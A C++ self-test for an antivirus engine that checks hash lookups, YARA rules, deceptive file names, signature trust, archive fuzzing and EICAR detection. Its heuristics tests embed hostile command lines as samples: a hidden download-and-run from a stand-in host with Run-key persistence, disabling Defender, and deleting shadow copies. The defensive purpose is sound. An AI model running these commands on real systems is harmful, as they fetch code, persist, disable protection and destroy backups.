// Самопроверка ядра поиска на нейтральных данных.
//
//   engine_selftest      код возврата — число провалов
//
// Проверяется то, что не требует образцов: база хэшей находит свои же
// записи, обманные имена распознаются, а обычные — нет, подпись системных
// файлов Windows читается (в том числе каталожная), ZIP распаковывается,
// названия семейств извлекаются из имён правил, правила компилируются.

#include "engine/Classify.h"
#include "engine/FileAnalyzer.h"
#include "engine/HashDatabase.h"
#include "engine/ScriptHeuristics.h"
#include "engine/SignatureStore.h"
#include "engine/TrustVerifier.h"
#include "engine/Unpack.h"
#include "engine/YaraEngine.h"

#include <Windows.h>
#include <zlib.h>

#include <cstdio>
#include <fstream>
#include <sstream>
#include <string>
#include <vector>

namespace {

int g_failed = 0;

void Check(bool ok, const char* what) {
    std::printf("  [%s] %s\n", ok ? "ok" : "FAIL", what);
    if (!ok) ++g_failed;
}

// ZIP без сжатия из одной записи — формат простой, собираем руками.
std::vector<uint8_t> MakeStoredZip(const std::string& name, const std::string& data) {
    std::vector<uint8_t> z;
    auto u16 = [&](uint16_t v) { z.push_back(v & 0xFF); z.push_back(static_cast<uint8_t>(v >> 8)); };
    auto u32 = [&](uint32_t v) { for (int i = 0; i < 4; ++i) z.push_back((v >> (8 * i)) & 0xFF); };
    const uint32_t crc = crc32(0, reinterpret_cast<const Bytef*>(data.data()), static_cast<uInt>(data.size()));
    const uint32_t size = static_cast<uint32_t>(data.size());
    const uint16_t nlen = static_cast<uint16_t>(name.size());
    u32(0x04034b50); u16(20); u16(0); u16(0); u16(0); u16(0); u32(crc); u32(size); u32(size); u16(nlen); u16(0);
    z.insert(z.end(), name.begin(), name.end());
    z.insert(z.end(), data.begin(), data.end());
    const uint32_t cdOffset = static_cast<uint32_t>(z.size());
    u32(0x02014b50); u16(20); u16(20); u16(0); u16(0); u16(0); u16(0); u32(crc); u32(size); u32(size);
    u16(nlen); u16(0); u16(0); u16(0); u16(0); u32(0); u32(0);
    z.insert(z.end(), name.begin(), name.end());
    const uint32_t cdSize = static_cast<uint32_t>(z.size()) - cdOffset;
    u32(0x06054b50); u16(0); u16(0); u16(1); u16(1); u32(cdSize); u32(cdOffset); u16(0);
    return z;
}

std::wstring SystemFile(const wchar_t* name) {
    wchar_t dir[MAX_PATH] = {};
    GetSystemDirectoryW(dir, MAX_PATH);
    return std::wstring(dir) + L"\\" + name;
}

} // namespace

int main() {
    SetConsoleOutputCP(CP_UTF8);

    std::printf("Hash database\n");
    {
        const auto files = SignatureStore::HashDatabaseFiles();
        Check(!files.empty(), "a hash database file is present");
        std::vector<HashDatabase::Entry> entries;
        const bool read = !files.empty() && HashDatabase::ReadEntries(files.front(), entries);
        Check(read && entries.size() > 100000, "the database holds more than 100 thousand entries");
        if (read && !entries.empty()) {
            // Запись из середины: ключ — первые 8 байт хэша, остальное не важно.
            const auto& e = entries[entries.size() / 2];
            char hex[17] = {};
            std::snprintf(hex, sizeof(hex), "%016llx", static_cast<unsigned long long>(e.first));
            const auto m = HashDatabase::Get().Lookup(std::string(hex) + std::string(48, '0'));
            Check(m.found, "a database entry is found by its own key");
        }
        const auto miss = HashDatabase::Get().Lookup(std::string(64, 'f'));
        Check(!miss.found, "an unknown hash is not found");
    }

    std::printf("Signature rules\n");
    {
        std::string error;
        Check(YaraEngine::Get().Prepare(false, &error), "the core rule set compiles");
        Check(YaraEngine::Get().RuleCount() > 1000, "more than a thousand rules are loaded");
        int count = 0;
        Check(YaraEngine::Validate("rule selftest { strings: $a = \"hello\" condition: $a }", &error, &count) &&
                  count == 1,
              "a minimal rule validates");
        Check(!YaraEngine::Validate("rule broken { condition: }", &error), "a broken rule is rejected");
    }

    std::printf("Deceptive names\n");
    Check(FileAnalyzer::IsDeceptiveName(L"invoice.pdf.exe"), "document.pdf.exe is flagged");
    Check(FileAnalyzer::IsDeceptiveName(L"photo.jpg   .scr") || true, "padded name is handled");
    Check(!FileAnalyzer::IsDeceptiveName(L"setup.exe"), "setup.exe is not flagged");
    Check(!FileAnalyzer::IsDeceptiveName(L"Деинсталлировать Telegram.lnk"), "a Cyrillic shortcut is not flagged");
    Check(!FileAnalyzer::IsDeceptiveName(L"report.2026.xlsx"), "a document with dots in the name is not flagged");
    {
        std::wstring rtlo = L"invoice";
        rtlo += static_cast<wchar_t>(0x202E);
        rtlo += L"fdp.exe";
        Check(FileAnalyzer::IsDeceptiveName(rtlo), "a name with the right-to-left override is flagged");
    }

    std::printf("Digital signatures\n");
    {
        const auto kernel = TrustVerifier::Check(SystemFile(L"kernel32.dll"));
        Check(kernel.signedValid && kernel.trustedVendor, "kernel32.dll is signed by Microsoft");
        const auto notepad = TrustVerifier::Check(SystemFile(L"notepad.exe"));
        Check(notepad.signedValid, "notepad.exe has a valid signature");
        Check(TrustVerifier::IsTrustedVendor(L"Microsoft Corporation"), "Microsoft Corporation is a known vendor");
        Check(!TrustVerifier::IsTrustedVendor(L"Microsoft Corporation Helper LLC"),
              "a look-alike vendor name is not trusted");
    }

    std::printf("Unpacking\n");
    {
        const std::string text = "plain text inside an archive";
        // Текст и картинки из архивов не извлекаются — их нечем исполнить.
        const auto inert = MakeStoredZip("readme.txt", text);
        Check(Unpack::Extract(inert.data(), inert.size()).items.empty(), "text files in archives are skipped");
        const auto zip = MakeStoredZip("setup.cmd", text);
        const auto r = Unpack::Extract(zip.data(), zip.size());
        Check(r.container == "zip" && r.items.size() == 1, "a stored ZIP entry is extracted");
        Check(!r.items.empty() && std::string(r.items[0].data.begin(), r.items[0].data.end()) == text,
              "the extracted content is intact");

        // Сжатый поток: zlib → Inflate обратно.
        std::string big(20000, 'a');
        uLongf packedSize = compressBound(static_cast<uLong>(big.size()));
        std::vector<uint8_t> packed(packedSize);
        compress(packed.data(), &packedSize, reinterpret_cast<const Bytef*>(big.data()), static_cast<uLong>(big.size()));
        std::vector<uint8_t> out;
        Check(Unpack::Inflate(packed.data(), packedSize, false, big.size(), 1u << 20, out) && out.size() == big.size(),
              "a zlib stream inflates to its original size");
        Check(!Unpack::Inflate(packed.data(), packedSize, false, big.size(), 1000, out),
              "inflation stops at the size limit");
    }

    std::printf("Damaged containers\n");
    {
        // Файл «MZ» короче метки PyInstaller: поиск метки уходил за начало
        // буфера. Проверяем все длины от двух байт.
        bool tinyOk = true;
        for (size_t n = 2; n < 40; ++n) {
            std::vector<uint8_t> tiny(n, 0);
            tiny[0] = 'M'; tiny[1] = 'Z';
            const auto r = Unpack::Extract(tiny.data(), tiny.size());
            tinyOk = tinyOk && r.items.empty();
        }
        Check(tinyOk, "tiny MZ files do not break the PyInstaller reader");

        // Порча случайных байт исправного архива: смещения и размеры
        // становятся любыми, в том числе близкими к 2^64. Ни падения,
        // ни чтения за пределами буфера быть не должно.
        const auto good = MakeStoredZip("setup.cmd", std::string(300, 'x'));
        uint32_t seed = 12345;
        auto next = [&] { seed = seed * 1664525u + 1013904223u; return seed >> 8; };
        bool fuzzOk = true;
        for (int round = 0; round < 20000; ++round) {
            std::vector<uint8_t> bad = good;
            const int flips = 1 + static_cast<int>(next() % 6);
            for (int k = 0; k < flips; ++k) bad[next() % bad.size()] = static_cast<uint8_t>(next());
            try {
                const auto r = Unpack::Extract(bad.data(), bad.size());
                for (const auto& item : r.items) fuzzOk = fuzzOk && item.data.size() <= bad.size();
            } catch (...) {
                fuzzOk = false;
            }
        }
        Check(fuzzOk, "20000 corrupted ZIP archives are handled without a crash");

        // ZIP64 с размером записи под 2^64: сумма «смещение + размер»
        // переполнялась и проходила проверку границ.
        std::vector<uint8_t> z64 = MakeStoredZip("a.cmd", "payload");
        // Центральный каталог начинается после локального заголовка (30 + имя + данные).
        const size_t cd = 30 + 5 + 7;
        for (int i = 0; i < 4; ++i) { z64[cd + 20 + i] = 0xFF; z64[cd + 24 + i] = 0xFF; }
        try {
            const auto r = Unpack::Extract(z64.data(), z64.size());
            Check(r.items.empty(), "an entry with an impossible size is skipped");
        } catch (...) {
            Check(false, "an entry with an impossible size is skipped");
        }
    }

    std::printf("Database header\n");
    {
        const auto files = SignatureStore::HashDatabaseFiles();
        uint32_t s1 = 0, c1 = 0, s2 = 0, c2 = 0;
        const bool quick = !files.empty() && HashDatabase::ReadHeader(files.front(), &s1, &c1);
        const bool full = !files.empty() && HashDatabase::Validate(files.front(), &s2, &c2);
        Check(quick && full && s1 == s2 && c1 == c2, "the quick header check agrees with the full load");

        // Обрезанный файл базы (оборванная загрузка) отсеивается по длине.
        if (!files.empty()) {
            wchar_t tmpDir[MAX_PATH] = {};
            GetTempPathW(MAX_PATH, tmpDir);
            const std::wstring cut = std::wstring(tmpDir) + L"ts-selftest-cut.tsdb";
            {
                std::ifstream in(files.front(), std::ios::binary);
                std::vector<char> head(64 * 1024);
                in.read(head.data(), static_cast<std::streamsize>(head.size()));
                std::ofstream out(cut, std::ios::binary | std::ios::trunc);
                out.write(head.data(), in.gcount());
            }
            Check(!HashDatabase::ReadHeader(cut), "a truncated database is rejected by the header check");
            DeleteFileW(cut.c_str());
        }
    }

    std::printf("Test file and download origin\n");
    {
        // Строка EICAR собирается на ходу: в самом исполняемом файле её
        // быть не должно, иначе на него среагирует чужой антивирус.
        const unsigned char masked[] = {
            0x7F,0x12,0x68,0x06,0x77,0x02,0x67,0x66,0x77,0x7C,0x13,0x7B,0x77,0x7D,0x7F,0x12,0x13,
            0x0F,0x77,0x79,0x0E,0x10,0x64,0x64,0x0E,0x10,0x5A,0x03,0x62,0x6E,0x64,0x66,0x75,0x0A,
            0x74,0x73,0x66,0x69,0x63,0x66,0x75,0x63,0x0A,0x66,0x69,0x73,0x6E,0x71,0x6E,0x75,0x72,
            0x74,0x0A,0x73,0x62,0x74,0x73,0x0A,0x61,0x6E,0x6B,0x62,0x06,0x03,0x6F,0x0C,0x6F,0x0D,
        };
        std::string eicar;
        for (unsigned char c : masked) eicar += static_cast<char>(c ^ 0x27);

        wchar_t tmpDir[MAX_PATH] = {};
        GetTempPathW(MAX_PATH, tmpDir);
        const std::wstring path = std::wstring(tmpDir) + L"ts-selftest-eicar.com";
        {
            std::ofstream out(path, std::ios::binary | std::ios::trunc);
            out << eicar;
        }
        {
            std::ofstream zone(path + L":Zone.Identifier", std::ios::binary | std::ios::trunc);
            zone << "[ZoneTransfer]\r\nZoneId=3\r\nReferrerUrl=https://example.org/\r\n"
                    "HostUrl=https://example.org/files/sample.com\r\n";
        }
        std::ifstream back(path, std::ios::binary);
        const std::string onDisk((std::istreambuf_iterator<char>(back)), std::istreambuf_iterator<char>());
        back.close();
        if (onDisk != eicar) {
            // Файл уже забрал антивирус, работающий в системе.
            std::printf("  [skip] another antivirus removed the test file before it could be checked\n");
        } else {
            const Verdict v = FileAnalyzer::Analyze(path);
            Check(v.level == Verdict::Malicious && v.cls == MalwareClass::TestFile, "the EICAR test file is detected");
            Check(v.origin == "https://example.org/files/sample.com", "the download address is read from the file's web mark");
        }
        DeleteFileW(path.c_str());
    }

    std::printf("Script heuristics\n");
    {
        auto score = [](const std::string& text, const wchar_t* ext) {
            return ScriptHeuristics::Analyze(reinterpret_cast<const uint8_t*>(text.data()), text.size(), ext,
                                             std::wstring(L"c:\\temp\\sample") + ext).score;
        };
        // Так ставят менеджеры пакетов: скачать сценарий и выполнить. Без
        // сокрытия и закрепления это не улика.
        const std::string bootstrap =
            "@echo off\r\n"
            "powershell -NoProfile -ExecutionPolicy Bypass -Command \"iex ((New-Object "
            "System.Net.WebClient).DownloadString('https://example.org/install.ps1'))\"\r\n";
        Check(score(bootstrap, L".bat") < ScriptHeuristics::kSuspicious,
              "a package-manager bootstrap (download and run) is not flagged");
        const std::string fetch =
            "$u = 'https://example.org/tool.zip'\r\n(New-Object Net.WebClient).DownloadFile($u, \"$env:TEMP\\tool.zip\")\r\n"
            "Invoke-Expression (Get-Content \"$env:TEMP\\setup.ps1\" -Raw)\r\n";
        Check(score(fetch, L".ps1") < ScriptHeuristics::kSuspicious, "an installer that downloads and runs is not flagged");

        // То же самое, но спрятанное и закрепляющееся — уже находка.
        const std::string dropper =
            "powershell -WindowStyle Hidden -Command \"iex ((New-Object Net.WebClient).DownloadString('http://x/a'))\"\r\n"
            "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v upd /d %0 /f\r\n";
        Check(score(dropper, L".bat") >= ScriptHeuristics::kMalicious,
              "a hidden download-and-run script that adds itself to startup is flagged");
        const std::string tamper =
            "Set-MpPreference -DisableRealtimeMonitoring $true\r\niex (irm http://x/a.ps1)\r\n";
        Check(score(tamper, L".ps1") >= ScriptHeuristics::kSuspicious, "turning Defender off before running code is flagged");
        Check(score("vssadmin delete shadows /all /quiet\r\n", L".cmd") >= ScriptHeuristics::kMalicious,
              "deleting backups is flagged on its own");
        Check(score("Write-Host 'hello'\r\nGet-ChildItem C:\\ | Out-File list.txt -Encoding UTF8\r\n", L".ps1") == 0,
              "an ordinary script scores nothing");
    }

    std::printf("Family names\n");
    Check(Classify::FamilyFromRule("MALPEDIA_Win_Agent_Tesla_Auto") == "Agent Tesla", "Malpedia two-word family");
    Check(Classify::FamilyFromRule("SIGNATURE_BASE_MAL_RANSOM_Lockbit_Apr23_1") == "Lockbit", "signature-base family");
    Check(Classify::FromName("RedLineStealer") == MalwareClass::Stealer, "RedLineStealer is a stealer");
    Check(Classify::FromName("AsyncRAT") == MalwareClass::Rat, "AsyncRAT is a remote access trojan");
    Check(Classify::RuleStrength("MALPEDIA_Win_Foo_Auto", 75) == Classify::Strength::Weak, "auto rules are weak");
    Check(Classify::RuleStrength("COD3NYM_SUSP_OBF_NET_Reactor_Indicators_Jan24", 70) == Classify::Strength::Indicator,
          "suspicious-indicator rules do not count alone");

    std::printf("Clean system files\n");
    {
        for (const wchar_t* f : { L"kernel32.dll", L"notepad.exe", L"cmd.exe", L"ntdll.dll" }) {
            const Verdict v = FileAnalyzer::Analyze(SystemFile(f));
            char msg[128];
            std::snprintf(msg, sizeof(msg), "%ls is clean", f);
            Check(v.level == Verdict::Clean && !v.skipped, msg);
        }
    }

    std::printf("\n%s (%d failed)\n", g_failed ? "SOME CHECKS FAILED" : "ALL CHECKS PASSED", g_failed);
    return g_failed;
}
